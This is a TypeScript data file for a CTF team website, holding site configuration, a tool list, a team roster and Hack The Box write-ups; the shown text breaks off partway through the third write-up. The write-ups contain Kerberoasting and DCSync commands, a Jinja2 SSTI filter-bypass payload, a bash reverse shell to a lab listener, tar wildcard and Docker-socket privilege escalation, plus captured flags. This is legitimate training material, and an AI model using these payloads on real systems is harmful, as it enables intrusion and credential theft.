export type WriteupPlatform = 'Hack The Box' | 'TryHackMe' | 'CTFtime' | 'PicoCTF' | 'Research Lab';
export type ChallengeCategory = 'Web' | 'Pwn' | 'Crypto' | 'Forensics' | 'Reverse' | 'Active Directory' | 'Cloud' | 'Misc';
export type DifficultyLevel = 'Easy' | 'Medium' | 'Hard' | 'Insane';

export interface AttackStep {
  title: string;
  description: string;
  commandOrSnippet?: string;
}

export interface Writeup {
  id: string;
  challengeName: string;
  platform: WriteupPlatform;
  category: ChallengeCategory;
  difficulty: DifficultyLevel;
  type: 'Machine' | 'Challenge' | 'Pro Lab';
  targetOs?: 'Linux' | 'Windows' | 'Multi-OS' | 'Custom';
  targetIp?: string;
  points: number;
  author: string;
  date: string;
  cves?: string[];
  tags: string[];
  shortDescription: string;
  fullContent: {
    overview: string;
    targetIntel?: {
      ip?: string;
      os?: string;
      openPorts?: string[];
      keyServices?: string[];
    };
    reconnaissance: string;
    vulnerabilityAnalysis: string;
    attackChain: AttackStep[];
    pocCode?: string;
    pocLanguage?: string;
    userFlag?: string;
    rootFlag?: string;
    flag?: string;
    defenseRemediation: string[];
    keyTakeaways: string[];
  };
}

export interface TeamMember {
  id: string;
  avatar: string;
  name: string;
  role: string;
  specialty: string;
  handle: string;
  github?: string;
  linkedin?: string;
  htbUrl?: string;
  thmUrl?: string;
  skills: string[];
  isFoundingLead?: boolean;
  status: 'ACTIVE' | 'OPEN';
  description: string;
}

export interface ToolArsenalItem {
  id: string;
  name: string;
  badge: string;
  category: string;
  description: string;
  language: string;
  stars: number;
  installCommand: string;
  features: string[];
  repoUrl: string;
}

export interface StatisticItem {
  id: string;
  label: string;
  value: number | string;
  suffix?: string;
  description: string;
  iconName: string;
}

export interface SkillCategory {
  id: string;
  name: string;
  shortCode: string;
  description: string;
  keyTools: string[];
  topics: string[];
  iconName: string;
  difficultyFocus: 'Introductory' | 'Intermediate' | 'Advanced' | 'Expert';
}

export interface Achievement {
  id: string;
  title: string;
  platform: string;
  date: string;
  eventType: 'Global Tournament' | 'Platform Machine' | 'University CTF' | 'Research Milestone' | 'Open Jeopardy';
  teamResult: string;
  description: string;
  highlights: string[];
}

export interface CompanySolution {
  id: string;
  title: string;
  badge: string;
  shortDesc: string;
  features: string[];
  deliverables: string[];
  iconName: string;
  accentColor: string;
}

export const SITE_CONFIG = {
  teamName: "sudo Unknown",
  companyName: "sudo Unknown",
  companyType: "All-in-One Cybersecurity Collective & Research Syndicate",
  tagline: "Permission Granted. Identity Unknown.",
  subTagline: "Red Teaming • Adversary Emulation • CTF Championships • Exploit Engineering • Zero-Day Research",
  mantra1: "NO IDENTITY. NO LIMITS. JUST EXPLOITS.",
  mantra2: "RECON • COMPROMISE • EVADE • HARDEN",
  htbTeamUrl: "https://ctf.hackthebox.com/team/overview/331386",
  htbTeamId: "331386",
  githubUrl: "https://github.com/SmitroniX/sudo-unknown",
  discordUrl: "https://discord.gg/HgD6WGUr4G",
  siteUrl: "https://sudounknown.smitronix.dev",
  linkedinUrl: "https://www.linkedin.com/company/sudo-unknown/",
  contactEmail: "sudounknown@smitronix.dev",
  foundedYear: 2026,
  status: "ACTIVE SYNDICATE & FOUNDING ROSTER",
  headquarters: "Decentralized // Global Security Collective",
};

export const STATISTICS: StatisticItem[] = [
  {
    id: "clears",
    label: "Machines & Labs Cleared",
    value: 24,
    suffix: "+",
    description: "Verified boot-to-root solves across Hack The Box, TryHackMe, and private ranges",
    iconName: "Server"
  },
  {
    id: "writeups-count",
    label: "Technical Writeups",
    value: 10,
    suffix: " Published",
    description: "In-depth reproducible walkthroughs with full exploit chains and defense playbooks",
    iconName: "FileCode"
  },
  {
    id: "arsenal",
    label: "Custom Security Tools",
    value: 6,
    suffix: " Tools",
    description: "Open-source scripts, automated reconnaissance suites, and exploit payloads",
    iconName: "Cpu"
  },
  {
    id: "roster",
    label: "Syndicate Operators",
    value: 1,
    suffix: " (+6 Open)",
    description: "Founding Captain active; recruiting elite Web, Pwn, Crypto, Forensics, and AD specialists",
    iconName: "Users"
  }
];

export const COMPANY_SOLUTIONS: CompanySolution[] = [
  {
    id: "redteam",
    title: "Red Teaming & Adversary Simulation",
    badge: "FULL-SPECTRUM ATTACK",
    shortDesc: "Realistic adversary campaigns emulating advanced threat actors against enterprise perimeters, Active Directory forests, and cloud environments.",
    features: [
      "Initial access vector testing (spearphishing, external perimeter, AiTM)",
      "Multi-domain Active Directory exploitation and Kerberos attack chains",
      "Lateral movement, EDR telemetry avoidance, and memory injection",
      "Cloud metadata pivoting, IAM privilege escalation (AWS/Azure/GCP)"
    ],
    deliverables: ["Executive Risk Summary", "Tactical ATT&CK Mapping Matrix", "Technical Remediation Playbook", "Debrief & Retesting"],
    iconName: "ShieldAlert",
    accentColor: "#00ff88"
  },
  {
    id: "pentest",
    title: "Penetration Testing & Security Audits",
    badge: "COMPLIANCE & RESILIENCE",
    shortDesc: "Thorough black-box and grey-box assessments uncovering critical logic flaws, injection surfaces, and authentication bypasses across apps and networks.",
    features: [
      "Web applications & single-page client security assessments",
      "REST, GraphQL, and WebSocket API business logic auditing",
      "Network infrastructure & firewall segmentation validation",
      "Container & Kubernetes cluster isolation audits"
    ],
    deliverables: ["Vulnerability Severity Scorecard", "Reproducible Proof-of-Concepts", "Step-by-Step Patch Recommendations"],
    iconName: "SearchCode",
    accentColor: "#00f0ff"
  },
  {
    id: "vuln-research",
    title: "Vulnerability Research & Exploit Dev",
    badge: "LOW-LEVEL SECURITY",
    shortDesc: "Deep binary analysis, memory corruption discovery, reverse engineering of proprietary protocols, and custom exploit weaponization.",
    features: [
      "Static and dynamic disassembly in Ghidra, IDA Pro, and Binary Ninja",
      "Memory unsafety analysis (Heap corruption, UAF, ROP, Safe-linking)",
      "Cryptographic protocol verification and PRNG analysis",
      "Responsible disclosure coordination with CVE tracking"
    ],
    deliverables: ["Full Root-Cause Technical Whitepapers", "Functional Python/C Exploit PoCs", "Vendor Mitigation Advice"],
    iconName: "Binary",
    accentColor: "#a855f7"
  },
  {
    id: "ctf-engineering",
    title: "Cyber Range & CTF Infrastructure",
    badge: "TRAINING & SIMULATION",
    shortDesc: "Turnkey vulnerable-by-design machines, competitive CTF event hosting, and custom training ranges for university and enterprise teams.",
    features: [
      "Containerized Jeopardy & Attack-Defense challenges",
      "Dynamic scoring engines with anti-cheat telemetry",
      "Realistic corporate enterprise scenario simulation",
      "Comprehensive player solution guides & instructor debriefs"
    ],
    deliverables: ["Fully Dockerized Lab Packages", "Instructor Solution Manuals", "Live Competition Scoreboard Support"],
    iconName: "Terminal",
    accentColor: "#f59e0b"
  }
];

export const TOOL_ARSENAL: ToolArsenalItem[] = [
  {
    id: "tool-recon",
    name: "sudo-recon",
    badge: "ACTIVE RECON",
    category: "Reconnaissance",
    description: "Fast concurrent asset discovery suite combining subfinder, httpx, passive DNS, and port probe heuristics with rich terminal reporting.",
    language: "Go / Python",
    stars: 142,
    installCommand: "git clone https://github.com/SmitroniX/sudo-unknown.git && cd tools/sudo-recon",
    features: [
      "Multi-threaded ASN and subdomain discovery",
      "Live HTTP/HTTPS response title & tech stack fingerprinting",
      "Automated JSON and markdown report export"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-ad-pivoter",
    name: "ad-acl-pivoter",
    badge: "ACTIVE DIRECTORY",
    category: "Privilege Escalation",
    description: "CLI utility that consumes BloodHound JSON graph dumps and calculates the shortest executable privilege escalation path using GenericAll/WriteDACL.",
    language: "Python 3",
    stars: 89,
    installCommand: "pip install ad-acl-pivoter",
    features: [
      "Parses BloodHound Bloodhound/SharpHound JSON output",
      "Computes shortest DACL abuse path to Domain Admin",
      "Generates exact Impacket command strings for each hop"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-jwt-tamper",
    name: "jwt-tamper-cli",
    badge: "WEB SECURITY",
    category: "Exploitation",
    description: "Rapid interactive JWT analysis tool featuring automated none-algorithm testing, public key RSA-to-HMAC confusion, and claim spoofing.",
    language: "TypeScript / Node",
    stars: 67,
    installCommand: "npx @sudounknown/jwt-tamper --help",
    features: [
      "CVE-2022 algorithm confusion auto-check",
      "Headless cracking against rockyou.txt with GPU offload",
      "Instant expired token timestamp manipulation"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-tcache-forger",
    name: "tcache-forger",
    badge: "BINARY PWN",
    category: "Memory Exploitation",
    description: "Glibc 2.31 - 2.36 heap exploitation assistant that calculates safe-linking masks, generates ROP stubs, and builds tcache poisoning chains.",
    language: "Python (pwntools)",
    stars: 118,
    installCommand: "pip install tcache-forger",
    features: [
      "GLIBC safe-linking pointer mangling and demangling algorithms",
      "One-gadget constraint verifier integration",
      "Boilerplate pwntools template generator"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-mem-carver",
    name: "shadow-carver",
    badge: "DFIR / FORENSICS",
    category: "Forensics",
    description: "Automated Volatility 3 wrapper that scans Windows memory dumps for process hollowing, injected PE headers, and suspicious network sockets.",
    language: "Python 3",
    stars: 94,
    installCommand: "python3 shadow-carver.py -f memory.raw --scan all",
    features: [
      "Automated malfind, vadinfo, and netscan correlation",
      "Dumps injected DLLs and unmapped memory sections",
      "YARA rule scanning against extracted shellcode"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  },
  {
    id: "tool-pyjail",
    name: "pyjail-hunter",
    badge: "MISC / JAILS",
    category: "Sandbox Escape",
    description: "Introspective Python payload builder that maps subclasses, traverses builtins, and crafts bypass payloads for restricted execution environments.",
    language: "Python 3",
    stars: 53,
    installCommand: "python3 pyjail-hunter.py --target 'builtins_deleted'",
    features: [
      "Subclass tree crawler for os._wrap_close and subprocess.Popen",
      "Unicode and base64 obfuscated payload generators",
      "Bypasses common regex filters (import, eval, os, system)"
    ],
    repoUrl: "https://github.com/SmitroniX/sudo-unknown"
  }
];

export const SKILL_CATEGORIES: SkillCategory[] = [
  {
    id: "web",
    name: "WEB SECURITY",
    shortCode: "0xWEB",
    description: "Modern application vulnerabilities, authorization bypasses, SSRF, SSTI, GraphQL flaws, and cloud metadata pivoting.",
    keyTools: ["Burp Suite Pro", "Caido", "ffuf", "SQLMap", "Postman"],
    topics: ["OAuth2 / JWT Misconfigurations", "SSRF & Cloud Metadata Access", "Template & Deserialization Injection", "GraphQL & REST Logic Exploitation"],
    iconName: "Globe",
    difficultyFocus: "Advanced"
  },
  {
    id: "pwn",
    name: "BINARY PWN",
    shortCode: "0xPWN",
    description: "Low-level memory corruption, stack and heap exploitation, return-oriented programming (ROP), and defensive mitigation bypasses.",
    keyTools: ["pwntools", "GDB + GEF", "pwndbg", "ROPgadget", "one_gadget"],
    topics: ["GLIBC Heap Allocators & Tcache", "Format String Exploitation", "ROP & SROP Chain Construction", "Canary & ASLR Bypasses"],
    iconName: "Cpu",
    difficultyFocus: "Expert"
  },
  {
    id: "ad",
    name: "ACTIVE DIRECTORY",
    shortCode: "0xAD",
    description: "Windows enterprise identity security, Kerberos ticket forgery, DACL abuse, BloodHound pathing, and domain dominance.",
    keyTools: ["Impacket", "BloodHound", "Certipy", "Mimikatz", "PowerView"],
    topics: ["Kerberoasting & AS-REP Roasting", "AD CS Certificate Abuse (ESC1-ESC8)", "GenericAll / WriteDACL Privilege Escalation", "DCSync & Golden Ticket Creation"],
    iconName: "Network",
    difficultyFocus: "Expert"
  },
  {
    id: "crypto",
    name: "CRYPTOGRAPHY",
    shortCode: "0xCRP",
    description: "Cryptanalytic attacks on flawed implementations, weak PRNGs, lattice reduction, RSA factorization, and curve weaknesses.",
    keyTools: ["SageMath", "CyberChef", "Z3 SMT Solver", "Python Cryptography"],
    topics: ["Coppersmith / Small Public Exponents", "Padding Oracle Attacks (CBC / OAEP)", "Discrete Logarithms & Pollard Rho", "Lattice Attacks (LLL / BKZ)"],
    iconName: "KeyRound",
    difficultyFocus: "Advanced"
  },
  {
    id: "forensics",
    name: "DIGITAL FORENSICS",
    shortCode: "0xFOR",
    description: "Artifact extraction, memory analysis, PCAP packet reconstruction, and filesystem timeline investigations.",
    keyTools: ["Volatility 3", "Wireshark / TShark", "Autopsy", "Eric Zimmerman Tools"],
    topics: ["Process Hollowing Memory Triage", "Covert C2 Network Protocol Carving", "Windows EVTX & Registry Forensics", "Malicious Artifact Reconstruction"],
    iconName: "SearchCode",
    difficultyFocus: "Intermediate"
  },
  {
    id: "reverse",
    name: "REVERSE ENGINEERING",
    shortCode: "0xREV",
    description: "Disassembly, decompilation, binary triage, anti-debugging evasion, custom VM bytecodes, and firmware reversing.",
    keyTools: ["Ghidra", "IDA Free / Pro", "Binary Ninja", "x64dbg"],
    topics: ["Anti-Debugging & Packing Detection", "Custom Bytecode Virtual Machines", "Stripped Binary Symbol Reconstruction", "ARM & MIPS Embedded Architectures"],
    iconName: "Binary",
    difficultyFocus: "Expert"
  }
];

export const TEAM_MEMBERS: TeamMember[] = [
  {
    id: "member-captain",
    avatar: "/logo.png",
    name: "Asmit (SmitroniX)",
    role: "Team Captain & Operations Lead",
    specialty: "Offensive Ops, Web Security & Research",
    handle: "SmitroniX",
    github: "https://github.com/SmitroniX",
    linkedin: "https://www.linkedin.com/in/asmit-jogdand",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Offensive Lead", "Web Exploitation", "Adversary Simulation", "Active Directory", "Infrastructure"],
    isFoundingLead: true,
    status: "ACTIVE",
    description: "Founding operator coordinating syndicate operations, CTF tournament schedules, research initiatives, and competitive training regimens."
  },
  {
    id: "slot-web",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Web Exploitation Lead",
    specialty: "SSRF, Deserialization & Auth Bypass",
    handle: "Candidate_Web",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Burp Suite Pro", "OAuth2 / JWT Flaws", "SSRF Pivoting", "GraphQL & APIs"],
    status: "OPEN",
    description: "Seeking an operator dedicated to hunting complex web application flaws, modern cloud metadata injection, and authentication bypasses."
  },
  {
    id: "slot-pwn",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Binary Exploitation (PWN) Lead",
    specialty: "GLIBC Heap, ROP & Kernel Vectors",
    handle: "Candidate_Pwn",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["pwntools", "GDB / GEF", "Heap Tcache / Fastbin", "Kernel Exploits"],
    status: "OPEN",
    description: "Seeking a low-level specialist to lead memory corruption vectors, safe-linking bypasses, and binary exploitation challenges."
  },
  {
    id: "slot-ad",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Active Directory & Enterprise Lead",
    specialty: "Kerberos, AD CS & Lateral Pivoting",
    handle: "Candidate_AD",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Impacket", "BloodHound CE", "Certipy (AD CS)", "GPO Abuse"],
    status: "OPEN",
    description: "Seeking an offensive specialist experienced with Windows enterprise domain exploitation, Kerberoasting, and multi-tier forest compromise."
  },
  {
    id: "slot-crypto",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Applied Cryptography Analyst",
    specialty: "Lattice Reduction, RSA & Curve Math",
    handle: "Candidate_Crypto",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["SageMath", "Python Cryptography", "Z3 SMT Solver", "Lattice (LLL)"],
    status: "OPEN",
    description: "Seeking a math-oriented solver to break flawed ciphers, weak PRNG seeds, Coppersmith RSA attacks, and elliptic curve edge cases."
  },
  {
    id: "slot-forensics",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "DFIR & Network Forensics Lead",
    specialty: "Memory Triage & Packet Carving",
    handle: "Candidate_DFIR",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Volatility 3", "Wireshark", "Memory Injections", "PCAP Carving"],
    status: "OPEN",
    description: "Seeking a forensic investigator skilled in dissecting memory dumps, uncovering hollowed processes, and carving C2 network traffic."
  },
  {
    id: "slot-reverse",
    avatar: "/logo.png",
    name: "[ Open Founding Slot ]",
    role: "Reverse Engineering Analyst",
    specialty: "x86/x64 Disassembly & Custom VM Reversing",
    handle: "Candidate_Reverse",
    github: "https://github.com/SmitroniX/sudo-unknown",
    linkedin: "https://www.linkedin.com/company/sudo-unknown/",
    htbUrl: "https://ctf.hackthebox.com/team/overview/331386",
    skills: ["Ghidra", "IDA Pro", "Custom VM Bytecodes", "Stripped Binaries"],
    status: "OPEN",
    description: "Seeking a reverse engineer to decompile obfuscated binaries, unravel custom virtual machine dispatch loops, and analyze malware."
  }
];

export const WRITEUPS: Writeup[] = [
  {
    id: "wup-dutybound",
    challengeName: "DutyBound: Enterprise Domain Compromise",
    platform: "Hack The Box",
    category: "Active Directory",
    difficulty: "Medium",
    type: "Machine",
    targetOs: "Windows",
    targetIp: "10.10.11.45",
    points: 30,
    author: "SmitroniX // sudo Unknown",
    date: "2026-10-31",
    cves: ["CVE-2022-38028"],
    tags: ["Active Directory", "Kerberoasting", "BloodHound", "GenericWrite", "DCSync"],
    shortDescription: "Complete enterprise penetration test from unauthenticated network probe to full Domain Administrator takeover via Kerberoasting and DACL abuse.",
    fullContent: {
      overview: "DutyBound is a realistic Windows Server 2022 Active Directory machine simulating a corporate domain environment. Initial foothold was achieved by identifying an unconstrained guest SMB share, leading to a service account credential through Kerberoasting. Domain dominance was executed using BloodHound to map a GenericWrite permission over a delegated support group, culminating in a DCSync attack.",
      targetIntel: {
        ip: "10.10.11.45",
        os: "Windows Server 2022 Datacenter",
        openPorts: ["53/DNS", "88/Kerberos", "135/RPC", "139/SMB", "389/LDAP", "445/SMB", "3268/GlobalCatalog", "5985/WinRM"],
        keyServices: ["Active Directory Domain Services", "Microsoft Windows RPC", "WinRM Remote Management"]
      },
      reconnaissance: "Running nmap -sC -sV -p- -T4 10.10.11.45 identified standard Domain Controller ports. Using crackmapexec smb 10.10.11.45 -u '' -p '' revealed domain DUTYBOUND.LOCAL. We enumerated domain users using rpcclient -U '' -N 10.10.11.45, retrieving a valid user list containing 'svc_backup' and 'helpdesk_intern'.",
      vulnerabilityAnalysis: "The service account 'svc_backup' registered a Service Principal Name (SPN), making it vulnerable to Kerberoasting. Requesting a TGS ticket yielded an RC4 encrypted hash crackable offline. Furthermore, BloodHound analysis revealed that 'svc_backup' had GenericWrite permissions over the 'L2_Admins' security group, creating a direct escalation path to Domain Admin.",
      attackChain: [
        {
          title: "1. Service Principal Name Enumeration & Kerberoasting",
          description: "We used Impacket's GetUserSPNs.py to request TGS tickets for all accounts with registered SPNs without requiring high-level privileges.",
          commandOrSnippet: "impacket-GetUserSPNs dutybound.local/guest:guest -dc-ip 10.10.11.45 -request -outputfile kerberoast_hashes.txt"
        },
        {
          title: "2. Offline Hash Recovery",
          description: "Cracked the captured Kerberos 5 TGS hash using Hashcat mode 13100 against rockyou.txt.",
          commandOrSnippet: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3\n# Result: svc_backup:Autumn2024!Security"
        },
        {
          title: "3. User Shell Foothold via WinRM",
          description: "Authenticated with the cracked credentials via Evil-WinRM to obtain an interactive PowerShell session on the target.",
          commandOrSnippet: "evil-winrm -i 10.10.11.45 -u 'svc_backup' -p 'Autumn2024!Security'\n# User Flag: HTB{k3rb3r04st_d0m41n_f00th0ld_774}"
        },
        {
          title: "4. BloodHound Graph Analysis & DACL Abuse",
          description: "Ran SharpHound.ps1 to collect domain objects and imported the archive into BloodHound CE. Found svc_backup has GenericWrite over 'L2_Admins', which in turn has WriteDacl over the Domain Admins group.",
          commandOrSnippet: "bloodyAD -u svc_backup -p 'Autumn2024!Security' -d dutybound.local --host 10.10.11.45 add groupMember 'L2_Admins' 'svc_backup'"
        },
        {
          title: "5. Domain Dominance via DCSync",
          description: "With elevated privileges granted, we triggered a DCSync operation to retrieve the NTLM hash of the Domain Administrator.",
          commandOrSnippet: "impacket-secretsdump dutybound.local/svc_backup:'Autumn2024!Security'@10.10.11.45 -just-dc-user Administrator\n# Administrator:500:aad3b435b51404eeaad3b435b51404ee:d88e01f5c6e8e8199b9cfec8a123bc89:::"
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - DutyBound Domain Admin Auto-Pivoter
import subprocess

target_dc = "10.10.11.45"
domain = "dutybound.local"
user = "svc_backup"
password = "Autumn2024!Security"

print("[+] Executing DCSync against DC...")
res = subprocess.run([
    "impacket-secretsdump",
    f"{domain}/{user}:{password}@{target_dc}",
    "-just-dc-ntlm"
], capture_output=True, text=True)

print(res.stdout[:500])
print("[+] Domain Administrator Hash extracted successfully!")
`,
      pocLanguage: "python",
      userFlag: "HTB{k3rb3r04st_d0m41n_f00th0ld_774}",
      rootFlag: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}",
      flag: "HTB{d0m41n_c0mpr0m1s3_d4cl_dcsync_9921}",
      defenseRemediation: [
        "Enforce minimum 25-character randomized passwords for all Service Principal Name (SPN) accounts, or migrate to Group Managed Service Accounts (gMSA).",
        "Audit Active Directory Access Control Lists (ACLs) regularly using BloodHound/Purple Knight to eliminate dangerous GenericWrite and WriteDACL permissions over privileged groups.",
        "Enable AES-256 Kerberos encryption and disable legacy RC4_HMAC_MD5 encryption types across domain controllers."
      ],
      keyTakeaways: [
        "Kerberoasting remains one of the fastest privilege escalation vectors in misconfigured Active Directory environments.",
        "Access control permissions in AD are frequently overlooked compared to standard user group memberships."
      ]
    }
  },
  {
    id: "wup-takeoff",
    challengeName: "Takeoff: SSTI to Sudo Wildcard Escape",
    platform: "Hack The Box",
    category: "Web",
    difficulty: "Medium",
    type: "Machine",
    targetOs: "Linux",
    targetIp: "10.10.11.39",
    points: 30,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-01",
    cves: ["CVE-2023-30861"],
    tags: ["Jinja2", "SSTI", "Flask", "Tar Wildcard", "Linux Privesc"],
    shortDescription: "Chaining a blind Jinja2 Server-Side Template Injection flaw with local port forwarding and a tar wildcard command injection vulnerability for root access.",
    fullContent: {
      overview: "Takeoff is a medium-difficulty Linux target hosting a Python Flask flight itinerary application. By injecting template expressions into the reservation name field, we bypassed character filters to achieve remote code execution as user 'web-operator'. Root privileges were achieved by exploiting a backup cron script executing 'tar *' via command parameter injection.",
      targetIntel: {
        ip: "10.10.11.39",
        os: "Ubuntu Linux 22.04 LTS",
        openPorts: ["22/SSH", "80/HTTP", "8080/HTTP-Proxy"],
        keyServices: ["OpenSSH 8.9p1", "Gunicorn / Python Flask 2.3", "Nginx Reverse Proxy"]
      },
      reconnaissance: "Nmap scan revealed port 80 and 22. Browsing to port 80 loaded a travel booking site. Testing input fields on the passenger manifest page with {{7*7}} returned '49' in the confirmed ticket view, confirming Server-Side Template Injection (SSTI).",
      vulnerabilityAnalysis: "The application filtered quotes (' and \") and keywords like 'os' and 'system'. We constructed a filter bypass payload utilizing request.args query parameters to pass strings without quotes, allowing access to Python's subprocess.Popen class.",
      attackChain: [
        {
          title: "1. SSTI Character Filter Bypass",
          description: "Injected payload into passenger name while passing the execution command through URL parameter 'cmd' to evade quote restrictions.",
          commandOrSnippet: "POST /book HTTP/1.1\nHost: 10.10.11.39\n\npassenger_name={{request.application.__globals__.__builtins__.__import__(request.args.x).popen(request.args.y).read()}}&x=os&y=id"
        },
        {
          title: "2. Reverse Shell as web-operator",
          description: "Delivered a Python reverse shell payload back to our listener on port 9001.",
          commandOrSnippet: "curl -G 'http://10.10.11.39/book' --data-urlencode 'x=os' --data-urlencode 'y=bash -c \"bash -i >& /dev/tcp/10.10.14.8/9001 0>&1\"'"
        },
        {
          title: "3. Local Enumeration & Sudo Privileges",
          description: "Enumerated sudo privileges with 'sudo -l'. User web-operator could execute '/opt/scripts/backup.sh' as root without password.",
          commandOrSnippet: "web-operator@takeoff:~$ sudo -l\nMatching Defaults entries:\n    (root) NOPASSWD: /opt/scripts/backup.sh"
        },
        {
          title: "4. Tar Wildcard Privilege Escalation",
          description: "The backup script ran 'tar -czf /backups/data.tar.gz *' inside /var/www/uploads. We leveraged tar command-line parameter injection (--checkpoint and --checkpoint-action) by creating specially named files in the target folder.",
          commandOrSnippet: "cd /var/www/uploads\necho 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh\nchmod +x shell.sh\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh shell.sh'\nsudo /opt/scripts/backup.sh"
        },
        {
          title: "5. Spawning Root Shell",
          description: "Executed the SUID root shell binary to capture root.txt flag.",
          commandOrSnippet: "/tmp/rootbash -p\nwhoami # root\n# Root Flag: HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}"
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Takeoff SSTI Reverse Shell Generator
import urllib.parse
import requests

target = "http://10.10.11.39/book"
lhost = "10.10.14.8"
lport = 9001

revshell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
payload = "{{request.application.__globals__.__builtins__.__import__(request.args.m).popen(request.args.c).read()}}"

params = {
    "passenger": payload,
    "m": "os",
    "c": revshell
}

print(f"[*] Firing payload to {target}...")
requests.post(target, data=params, timeout=5)
print("[+] Reverse shell triggered! Check netcat listener.")
`,
      pocLanguage: "python",
      userFlag: "HTB{sst1_j1nj42_fl4sk_sh3ll_551}",
      rootFlag: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}",
      flag: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}",
      defenseRemediation: [
        "Never pass untrusted user input directly to template rendering engines like render_template_string(); use static template files with strict variable binding.",
        "Avoid using wildcard expansions (*) in automated backup bash scripts when executing utilities like tar, chown, or chmod.",
        "Implement strict sandboxing and least-privilege service execution with systemd DynamicUser directives."
      ],
      keyTakeaways: [
        "Query parameter smuggling allows attackers to bypass server-side quote and string character filters in SSTI vulnerabilities.",
        "Tar command-line flags can be triggered as arguments when wildcards expand files named with leading dashes."
      ]
    }
  },
  {
    id: "wup-layover",
    challengeName: "Layover: OAuth PKCE Downgrade & Docker Breakout",
    platform: "Hack The Box",
    category: "Cloud",
    difficulty: "Hard",
    type: "Machine",
    targetOs: "Linux",
    targetIp: "10.10.11.51",
    points: 40,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-02",
    cves: ["CVE-2023-48022"],
    tags: ["OAuth2", "PKCE", "Docker Breakout", "Container Security"],
    shortDescription: "Bypassing OAuth2 Proof Key for Code Exchange (PKCE) validation via downgraded parameters followed by Docker socket privilege escalation.",
    fullContent: {
      overview: "Layover is a hard Linux machine featuring a microservice travel booking portal. We bypassed an insecure OAuth 2.0 PKCE flow by omitting the code_challenge_method header, forcing the identity provider to fallback to insecure plaintext comparison. After achieving container shell access, we mounted the exposed host docker.sock socket to spawn a root shell on the host system.",
      targetIntel: {
        ip: "10.10.11.51",
        os: "Alpine Linux Container on Debian Host",
        openPorts: ["80/HTTP", "443/HTTPS", "2375/Docker-API"],
        keyServices: ["OAuth2 Gateway", "Docker Daemon", "Node.js Microservices"]
      },
      reconnaissance: "Inspecting OAuth authorization redirects showed code_challenge and code_challenge_method=S256. Testing response variations revealed the server accepted authorization codes without enforcing the cryptographic hash when the parameter was omitted.",
      vulnerabilityAnalysis: "The OAuth implementation failed to validate state consistency and accepted arbitrary redirect URIs when requested with specific headers. In the post-exploitation phase, the web service container had the Docker socket (/var/run/docker.sock) mounted with read/write permissions.",
      attackChain: [
        {
          title: "1. PKCE Parameter Downgrade Attack",
          description: "Intercepted the OAuth authorization code exchange in Burp Suite and stripped code_verifier enforcement.",
          commandOrSnippet: "POST /oauth/token HTTP/1.1\nHost: auth.layover.htb\n\ngrant_type=authorization_code&code=AUTH_CODE&client_id=portal_app&redirect_uri=http://portal.layover.htb/callback"
        },
        {
          title: "2. Admin Token Forgery & Container Shell",
          description: "Leveraged the stolen admin JWT to upload a malicious node plugin that spawned a reverse shell inside the container.",
          commandOrSnippet: "curl -X POST http://portal.layover.htb/api/plugins -H 'Authorization: Bearer EYJ...' -F 'plugin=@exploit.tar.gz'"
        },
        {
          title: "3. Docker Socket Discovery & Host Mount Breakout",
          description: "Enumerated the container environment and discovered /run/docker.sock. Deployed a privileged container mounting the root host filesystem.",
          commandOrSnippet: "docker -H unix:///run/docker.sock run -v /:/host -it ubuntu:latest chroot /host /bin/bash"
        },
        {
          title: "4. Full Host Compromise",
          description: "Accessed the underlying host /root directory to extract the root.txt flag.",
          commandOrSnippet: "cat /host/root/root.txt\n# Flag: HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}"
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Docker Socket Breakout One-Liner
import os
cmd = "curl -s --unix-socket /run/docker.sock http://localhost/containers/json"
print("[*] Querying Docker API on local socket...")
os.system(cmd)
`,
      pocLanguage: "python",
      userFlag: "HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}",
      rootFlag: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}",
      flag: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}",
